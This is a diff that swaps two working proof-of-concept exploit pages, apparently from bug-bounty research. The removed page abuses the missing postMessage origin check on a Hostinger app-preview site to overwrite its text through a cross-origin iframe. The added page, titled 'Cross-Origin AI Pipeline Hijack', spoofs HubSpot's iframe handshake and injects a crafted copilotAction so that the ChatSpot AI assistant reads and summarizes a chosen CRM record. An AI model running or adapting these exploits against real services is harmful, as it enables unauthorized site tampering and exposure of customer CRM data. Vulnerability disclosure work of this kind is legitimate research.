@@ -1,114 +1,173 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>PoC - Hostinger app-preview postMessage no origin check</title>
-  <style>
-    body { font-family: monospace; background: #1a1a1a; color: #0f0; padding: 20px; }
-    #log { background: #000; padding: 10px; height: 200px; overflow-y: auto; border: 1px solid #0f0; }
-    iframe { width: 100%; height: 500px; border: 2px solid red; }
-    button { background: #0f0; color: #000; border: none; padding: 8px 16px; margin: 4px; cursor: pointer; font-weight: bold; }
-    #attacker-text { background: #000; color: #f90; border: 1px solid #f90; padding: 6px 10px; font-family: monospace; font-size: 14px; width: 420px; }
-    label { color: #aaa; font-size: 13px; }
-    .note { color: #666; font-size: 12px; margin: 4px 0 8px; }
-  </style>
-</head>
-<body>
-  <h2>PoC: app-preview.com postMessage — no origin check</h2>
-  <p>Origin of THIS page: <strong id="origin"></strong></p>
-  <p>Target iframe: <strong>https://8f07ab61-4993-4c92-87a6-32869d1ca162.app-preview.com</strong></p>
 
-  <p>
-    <label>Attacker payload (newText):</label><br>
-    <input id="attacker-text" type="text" value="PWNED BY ATTACKER — postMessage no origin check" />
-  </p>
+ <html>
+  <head>
+    <meta charset="utf-8">
+    <title>HubSpot ChatSpot PoC</title>
+    <style>
+      body { font-family: monospace; padding: 20px; background: #111; color:
+   #eee; }
+      input, select { background: #222; color: #eee; border: 1px solid #444;
+   padding: 4px 8px; width: 100%; box-sizing: border-box; font-family:
+  monospace; font-size: 13px; }
+      label { display: block; margin-top: 10px; font-size: 12px; color:
+  #aaa; }
+      button { margin-top: 12px; margin-right: 6px; padding: 6px 14px;
+  cursor: pointer; background: #333; color: #eee; border: 1px solid #555;
+  font-family: monospace; }
+      button:hover { background: #444; }
+      #log { margin-top: 14px; background: #000; border: 1px solid #333;
+  padding: 10px; height: 220px; overflow-y: auto; font-size: 12px; }
+      .ok   { color: #0f0; }
+      .err  { color: #f44; }
+      .inf  { color: #48f; }
+      .warn { color: #fa0; }
+      hr { border-color: #333; margin: 14px 0; }
+    </style>
+  </head>
+  <body>
 
-  <div>
-    <button onclick="sendMsg('enable-edit-mode')">1. enable-edit-mode</button>
-    <button onclick="sendMsg('enableSelectionMode')">2. enableSelectionMode</button>
-    <button onclick="sendEditSave()">3. edit-save</button>
-    <button onclick="sendMsg('disable-edit-mode')">4. disable-edit-mode</button>
-    <button onclick="sendAll()">RUN ALL (auto)</button>
-    <button onclick="resetIframe()" style="background:#444;color:#ccc;">↺ Reset</button>
-  </div>
-  <p class="note">
-    Manual flow: click 1 → click 2 → click any text inside the iframe → click 3<br>
-    Auto flow: RUN ALL (requires clicking a text element in the iframe within the 3s window)
-  </p>
+  <b>HubSpot — Cross-Origin AI Pipeline Hijack</b>
+  <hr>
+
+  <label>Portal ID</label>
+  <input id="portalId" value="146256700">
+
+  <label>Object ID</label>
+  <input id="objectId" value="739644991696">
+
+  <label>Object Type</label>
+  <select id="objectTypeId">
+    <option value="0-1">0-1 — Contact</option>
+    <option value="0-2">0-2 — Company</option>
+    <option value="0-3">0-3 — Deal</option>
+  </select>
+
+  <label>Object Name <span style="color:#666">(injected into AI
+  query)</span></label>
+  <input id="objectName" value="Figma Elastic">
+
+  <br>
+  <button onclick="launch()">▶ Launch (auto-fires)</button>
+  <button onclick="reset()">Reset</button>
+  <button onclick="clearLog()">Clear log</button>
 
   <div id="log"></div>
 
-  <iframe id="target" src="https://8f07ab61-4993-4c92-87a6-32869d1ca162.app-preview.com/"></iframe>
-
   <script>
-    document.getElementById('origin').textContent = window.location.origin;
+  let iframeEl = null;
+  let chatspotId = null;
 
-    const logEl = document.getElementById('log');
-    const iframe = document.getElementById('target');
-    const TARGET = 'https://8f07ab61-4993-4c92-87a6-32869d1ca162.app-preview.com/';
+  function log(label, msg, cls) {
+    const d = document.getElementById('log');
+    const line = document.createElement('div');
+    line.className = cls || 'inf';
+    const ts = new Date().toISOString().slice(11, 23);
+    line.textContent = '[' + ts + '] [' + label + '] ' + (typeof msg ===
+  'object' ? JSON.stringify(msg) : msg);
+    d.appendChild(line);
+    d.scrollTop = d.scrollHeight;
+  }
 
-    const log = (msg) => {
-      const ts = new Date().toISOString().split('T')[1].slice(0, 12);
-      logEl.innerHTML += `[${ts}] ${msg}<br>`;
-      logEl.scrollTop = logEl.scrollHeight;
+  function clearLog() { document.getElementById('log').innerHTML = ''; }
+
+  function reset() {
+    if (window._hsPoC) window.removeEventListener('message', window._hsPoC);
+    if (iframeEl) iframeEl.remove();
+    iframeEl = null;
+    chatspotId = null;
+    log('RESET', 'cleared', 'warn');
+  }
+
+  function launch() {
+    reset();
+
+    const portalId = document.getElementById('portalId').value;
+    const objectId = document.getElementById('objectId').value;
+    const objectTypeId = document.getElementById('objectTypeId').value;
+    const objectTypeLabel = objectTypeId === '0-1' ? 'Contact' :
+  objectTypeId === '0-2' ? 'Company' : 'Deal';
+    const objectName = document.getElementById('objectName').value;
+    const freshThread = crypto.randomUUID();
+
+    const ACTION = encodeURIComponent(JSON.stringify({
+      intent: 'object_summary',
+      objectId,
+      objectTypeId,
+      objectTypeLabel,
+      objectName,
+      label: objectTypeLabel,
+      summaryType: 'STANDARD'
+    }));
+
+    const src = 'https://app-eu1.hubspot.com/chatspot-widget-ui/' + portalId
+   + '/chat'
+      + '?hostAppName=attacker'
+      + '&copilotThreadId=' + freshThread
+      + '&copilotAction=' + ACTION;
+
+    log('LAUNCH', 'thread=' + freshThread, 'inf');
+
+    iframeEl = document.createElement('iframe');
+    iframeEl.src = src;
+    iframeEl.style.cssText = 'position:fixed;top:0;right:0;width:450px;height:100vh;border:none;z-index:9999';
+    document.body.appendChild(iframeEl);
+
+    window._hsPoC = function(e) {
+      if (e.origin !== 'https://app-eu1.hubspot.com') return;
+      let d;
+      try { d = typeof e.data === 'string' ? JSON.parse(e.data) : e.data; }
+  catch(_) { return; }
+      if (!d || !d.payload) return;
+
+      const type = d.payload.type;
+
+      if (type === 'SYNC_ACK') {
+        chatspotId = d.from;
+        log('HIJACKED', 'origin trust stolen — id=' + chatspotId, 'ok');
+      }
+
+      if (type === 'READY') {
+        log('READY', 'sending SET_COMPONENT_STATE', 'ok');
+        iframeEl.contentWindow.postMessage({
+          id: crypto.randomUUID(), format: '__hs-ifr', from: 'HOST', to:
+  chatspotId, v: 1,
+          payload: {
+            type: 'SET_COMPONENT_STATE',
+            updates: { isOpen: true, isReady: true, isLoaded: true,
+  isDisabled: false, isFullscreenMode: false },
+            target: 'nav-components:chatspot-sidebar'
+          }
+        }, '*');
+      }
+
+      if (type === 'INVOKE_CAPABILITY'
+        && d.payload.name === 'UPDATE_QUERY_PARAM_CAP'
+        && d.payload.args?.key === 'copilotAction'
+        && d.payload.args?.value === '') {
+        log('AI FIRED', 'pipeline triggered — AI reading CRM object ' +
+  objectId, 'ok');
+      }
+
+      if (type === 'INVOKE_CAPABILITY') {
+        log('CAP', d.payload.name, 'inf');
+      }
     };
+    window.addEventListener('message', window._hsPoC);
 
-    function getPayload() {
-      return document.getElementById('attacker-text').value;
-    }
-
-    function sendMsg(type, payload) {
-      const msg = payload !== undefined ? { type, payload } : { type };
-      iframe.contentWindow.postMessage(msg, '*');
-      log(`SENT → type="${type}" payload=${JSON.stringify(payload ?? null)}`);
-    }
-
-    function sendEditSave() {
-      sendMsg('edit-save', { newText: getPayload() });
-    }
-
-    function resetIframe() {
-      log('--- Resetting iframe ---');
-      iframe.src = TARGET + '?t=' + Date.now();
-    }
-
-    function sendAll() {
-      log('--- Starting attack sequence ---');
-      setTimeout(() => sendMsg('enable-edit-mode'), 500);
-      setTimeout(() => sendMsg('enableSelectionMode'), 1000);
-      // edit-save fires at 4s — click a text element in the iframe before then
-      setTimeout(() => sendEditSave(), 4000);
-      setTimeout(() => log('--- Sequence complete. Check DevTools → Network → /api/apply-edit ---'), 4500);
-    }
-
-    // Listen for messages from the iframe
-    window.addEventListener('message', (event) => {
-      if (!event.origin.includes('app-preview')) return;
-
-      const type = event.data?.type || event.data?.message;
-      log(`RECEIVED ← origin="${event.origin}" type="${type}" data=${JSON.stringify(event.data).slice(0, 200)}`);
-
-      // editEnter: element was clicked, currentEditingInfo is set — fire edit-save immediately
-      if (type === 'editEnter') {
-        const currentText = event.data?.payload?.currentText;
-        log(`>>> editEnter! currentText="${currentText}" — auto-firing edit-save`);
-        setTimeout(() => sendEditSave(), 200);
-      }
-
-      if (type === 'editApplied') {
-        log(`>>> SUCCESS — editApplied! editId="${event.data?.payload?.editId}"`);
-      }
-
-      if (type === 'route-changed') {
-        log('--- route-changed: HMR reloaded. Click ↺ Reset then redo. ---');
-      }
+    iframeEl.addEventListener('load', () => {
+      setTimeout(() => {
+        const embedId = crypto.randomUUID();
+        iframeEl.contentWindow.postMessage({
+          id: crypto.randomUUID(), format: '__hs-ifr', from: 'HOST', to:
+  embedId, v: 1,
+          payload: { type: 'SYNC', embedId, group: 'iframeable', name:
+  'embed', appData: {}, embeddedProps: {} }
+        }, '*');
+        log('SYNC', 'handshake sent', 'inf');
+      }, 1000);
     });
-
-    iframe.addEventListener('load', () => {
-      log('iframe loaded ✓ — ready to send messages');
-      log('This origin (' + window.location.origin + ') is NOT in ALLOWED_PARENT_ORIGINS');
-    });
-
-    log('PoC loaded.');
+  }
   </script>
-</body>
-</html>
+
+  </body>
+  </html>
